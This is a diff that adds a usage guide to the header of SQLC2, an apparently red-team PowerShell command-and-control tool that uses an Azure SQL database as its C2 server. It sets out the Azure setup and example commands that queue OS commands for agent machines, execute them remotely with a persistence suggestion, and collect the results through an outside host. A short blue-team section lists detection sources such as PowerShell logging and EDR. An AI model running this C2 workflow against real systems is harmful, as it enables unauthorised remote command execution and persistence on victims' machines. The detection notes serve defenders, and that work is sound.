@@ -8,6 +8,66 @@
 		     and command grabbing from the C2 SQL Server.
 	Author:  Scott Sutherland (@_nullbind), NetSPI 2018
 	License: BSD 3-Clause
+    Mini Guide:
+
+    ----------------------------
+    Azure Configuration Overview
+    ----------------------------
+
+    1. Create an Azure account and log in.
+
+    3. Create a SQL server databse. In this example the server will be named sqlcloudc2 and the datatabase will be named database1.
+
+    4. Add a virtual firewall exception for the target networks that you will be receiving connections from.
+
+    ----------------------------
+    Attack Workflow Overview
+    ----------------------------
+    1. Install SQLC2.
+
+    Install C2 tables in remote SQL Server instance. You will need to provide an database that you have the ability to create tables in, or create a new at database.  However, in Azure I've been getting some timeouts which is why you should have already created the target database through Azure.  
+
+    Example command:
+    Install-SQLC2 -Username CloudAdmin -Password 'CloudPassword!' -Instance sqlcloudc2.database.windows.net -Database database1 -Verbose 
+
+    2. Setup OS command.
+
+    Set a OS command to run on all agent systems.  You can also configure commands to run on a specific agent using the -ServerName paremeter.
+
+    Example command:
+    Set-SQLC2Command -Username CloudAdmin -Password 'CloudPassword!' -Instance sqlcloudc2.database.windows.net -Database database1 -Verbose -Command "Whoami"
+
+    3. List queued commands.
+
+    The command below will query the SQLC2 server for a list of commands queued for the agent to execute. This will only output the commands, it will not execute them.
+
+    Example command:
+    Get-SQLC2Command -Username CloudAdmin -Password 'CloudPassword!' -Instance sqlcloudc2.database.windows.net -Database database1 -Verbose 
+
+    4. The agent will automatically be registered.  To list the registered agent use the command below.
+
+     Get-SQLC2Agent -Username CloudAdmin -Password 'CloudPassword!' -Instance sqlcloudc2.database.windows.net -Database database1 -Verbose 
+
+    3. Execute queued commands.
+
+    The command below will query the SQLC2 server for a list of commands queued for the agent to execute. Including the -Execute flag will automatically run them.  This command could be used in combination with your prefered persistence method such as a scheduled task.
+
+    Example command:
+    Get-SQLC2Command -Username CloudAdmin -Password 'CloudPassword!' -Instance sqlcloudc2.database.windows.net -Database database1 -Verbose -Execute
+
+    6. View command results.
+
+    The command below can be used to retrieve the command results. By default it shows the entire command history. However, results can be filtered by -Status, -ServerName, and -Cid.
+
+    Example command:
+    Get-SQLC2Result -Username CloudAdmin -Password 'CloudPassword!' -Instance sqlcloudc2.database.windows.net -Database database1 -Verbose -Status 'success'
+
+    ----------------------------
+    Blue Team Datasource Notes
+    ----------------------------
+    1. PowerShell logging.
+    2. EDR showing PowerShell connecting to the internet. Specifically, *.database.windows.net (Azure)
+    3. EDR showing specific commands being executed such as "Get-SQLC2Comand".
 #>
 
 
